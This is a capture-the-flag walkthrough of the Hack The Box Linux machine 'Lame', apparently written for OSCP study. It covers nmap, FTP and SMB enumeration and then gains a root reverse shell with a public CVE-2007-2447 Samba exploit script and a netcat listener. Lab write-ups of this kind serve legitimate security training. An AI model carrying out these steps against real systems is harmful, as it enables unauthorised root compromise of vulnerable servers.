---
description: 10.10.10.3
---

# Lame

![](../../.gitbook/assets/1.JPG)

| **Machine Name** | Lame  |
| ---------------- | ----- |
| Difficulty       | Easy  |
| Type             | Linux |

## Overview

The following exploits are covered for obtaining the flags on this target:

* CVE-2007-2447 - Samba 3.0.20 < 3.0.25rc3 "Username map script" command execution

## Enumeration

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.3 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 09:01 EDT
Nmap scan report for 10.10.10.3
Host is up (0.018s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 112.46 seconds
```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sC -sV -A -p21,22,139,445,3632 10.10.10.3 -Pn                                               130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 09:03 EDT
NSE: DEPRECATION WARNING: bin.lua is deprecated. Please use Lua 5.3 string.pack
Nmap scan report for 10.10.10.3
Host is up (0.019s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m22s, deviation: 2h49m44s, median: 20s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-09-01T09:04:40-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   19.23 ms 10.10.14.1
2   21.58 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.84 seconds
```

The nmap output provides us with a lot of useful information, including version details and where possible, service specific information. In this case, we can see the target is running ftp, ssh, smb and something called distccd.

### FTP

Let's connect to the ftp service using the "anonymous" account with any password.

```
└─$ ftp 10.10.10.3  
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
257 "/"
ftp> exit
221 Goodbye.

```

We are able to login to the ftp service anonymously, however, there is nothing in the ftp share.

Let's check the version of vsftpd against the exploitdb:

```
└─$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                      | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                         | unix/remote/17491.rb
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We get 2 results for this version of the software, where both relate to CVE-2011-2523. Let's copy the manual exploit to our working directory and review it in a text editor. Since the script looks ok (nothing malicious that could destroy our attacker machine), let's run it:

```
└─$ python3 49757.py 10.10.10.3
^C   [+]Exiting...

```

That didn't work. We could investigate why that didn't work, but in this case let's move on for now as we could always revisit this later on.

### SMB

#### smbmap

Let's run smbmap to see if there are any shares accesible to us:

```
└─$ smbmap -H 10.10.10.3                         
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
Disk        Permissions     Comment
----        -----------     -------
print$      NO ACCESS       Printer Drivers
tmp         READ, WRITE     oh noes!
opt         NO ACCESS
IPC$        NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$      NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

```

As we can see, there is a writable share called "tmp".&#x20;

#### smbclient

Let's attempt to connect to it using the Samba smbclient. For details on command syntax and options refer to the link below:

{% embed url="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" %}

```
└─$ smbclient \\\\10.10.10.3\\tmp                                                                            1 ⨯
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

```

That didn't work, however, the error message is not quite what we would expect to see if we were not allowed to connect, but rather it appears to be related to the protocol itself. After a quick google for the error message, we find the following page:

{% embed url="https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed" %}

According to the article, we are connecting using a version of the SMB protocol that is higher than the version running on the target, which is resulting in the error message. We need to modify our smb.conf file to enable support for the lower version of SMB.

> NOTE: Enabling SMBv1 is NOT a good idea in a production environment. Since we are in a lab setting it's safe to do this.

As per the article, add the following lines to the \[global] section of the /etc/samba/smb.conf file on your system using a text editor such as vi or nano and save:

```
# Fix to enable connections to older versions of the SMB protocol
   client min protocol = CORE
   client max protocol = SMB3

```

Now, when we try and connect to the share again using smbclient, it works.

```
└─$ smbclient \\\\10.10.10.3\\tmp
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  1 10:00:20 2021
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Wed Sep  1 09:22:30 2021
  vmware-root                        DR        0  Wed Sep  1 09:23:00 2021
  .X11-unix                          DH        0  Wed Sep  1 09:22:55 2021
  .X0-lock                           HR       11  Wed Sep  1 09:22:55 2021
  5562.jsvc_up                        R        0  Wed Sep  1 09:23:33 2021
  vgauthsvclog.txt.0                  R     1600  Wed Sep  1 09:22:28 2021

                7282168 blocks of size 1024. 5386536 blocks available
smb: \> 
```

There does not appear to be any useful files here, but we can download them and inspect them to be sure.

```
└─$ smbclient \\\\10.10.10.3\\tmp
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \.X0-lock of size 11 as .X0-lock (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED opening remote file \5562.jsvc_up
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (23.3 KiloBytes/sec) (average 11.5 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \vmware-root\*
NT_STATUS_ACCESS_DENIED opening remote file \.X11-unix\X0
smb: \>
```

We only managed to grab some of the files. Looking at those files reveals nothing of further interest.

#### rpcclient

We can also try and gather more information from the target using rpcclient, which is a tool for executing client side MS-RPC functions. Check out the following page for more details:

{% embed url="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html" %}

```
└─$ rpcclient -U "" -N 10.10.10.3     
rpcclient $>
```

This tool can provide us with some useful information. For example, we can try and get a list of users with the **querydispinfo **command. This command can sometimes reveal details that should not be seen via anonymous access, including passwords stored in the description field. Another useful command to get a list of users is **enumdomusers, **which gives a more concise lsit of users and their RID numbers. For more command options type **help **or visit the link above.

```
rpcclient $> querydispinfo
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
rpcclient $>
```

Let's check the Samba version that we got from the nmap scan against the exploitdb:

```
└─$ searchsploit samba 3.0.20
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                         | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploi | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                          | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                          | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                  | linux_x86/dos/36741.py
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We don't want a DoS, and the target is running version 3.0.20, so that rules out the bottom three options. The "Format String / Security Bypass" option does not provide much detail, so let's look at the Metasploit option a bit closer.&#x20;

## Gaining Access

A quick review of the "Username map script" page on [exploitdb.com](https://www.exploitdb.com) confirms that this exploit is documented as CVE-2007-2447.

{% embed url="https://www.exploit-db.com/exploits/16320" %}

Since we are preparing for the OSCP, we need to find a way to exploit the target without using Metasploit.&#x20;

> NOTE: We recommend attempting to exploit the target manually first, and then to also do it via Metasploit. There are plenty of walkthroughs online which use Metasploit, and so it won't be covered here.

A quick google search reveals the following page which contains an exploit script that we can examine and run manually:

{% embed url="https://github.com/amriunix/CVE-2007-2447" %}

After downloading and reviewing the script, it appears to be safe to run against the target. First, setup a netcat listener:

```
└─$ nc -nvlp 8002
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8002
Ncat: Listening on 0.0.0.0:8002

```

Next, execute the script with the required options as shown in the usage output (or from reviewing the script itself):

```
└─$ python3 usermap_script.py                                                                                1 ⨯
[*] CVE-2007-2447 - Samba usermap script
[-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

└─$ python3 usermap_script.py 10.10.10.3 139 10.10.14.3 8002
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !

```

Back in netcat, we get a shell as the root user:

```
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:56005.
whoami
root
```

The shell is non-interactive, which means that we cannot run programs that require user input such as "su" or "sudo". If we try and run an interactive program the shell will crash and we will have to reconnect. To fix this we need to "upgrade" the shell to an interactive one. There are many ways to do this (see Upgrading Shells), but we'll be using python here as shown below:

```
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# id
id
uid=0(root) gid=0(root)
root@lame:/# 

```

We are now getting the feedback redirected properly into the interactive shell. This is still not a fully interactive shell, but will suffice for the purposes of this article.

All we need to do now is grab the user and the root flags.

## Summary

This machine is nice because although it is easy, there are a few additional quirks to work out when trying to hack into it. We had to modify our local smb configuration to support the use of the SMBv1 protocol which is not enabled by default in modern implementations of Samba. We also got to use some built in Samba and RPC tools that would be installed on file servers and the clients that access them. Finally, we had to upgrade from a non-interactive shell to a semi-interactive one.  Whilst this machine was not very challenging, it is definitely worth the time and effort it takes to complete it.
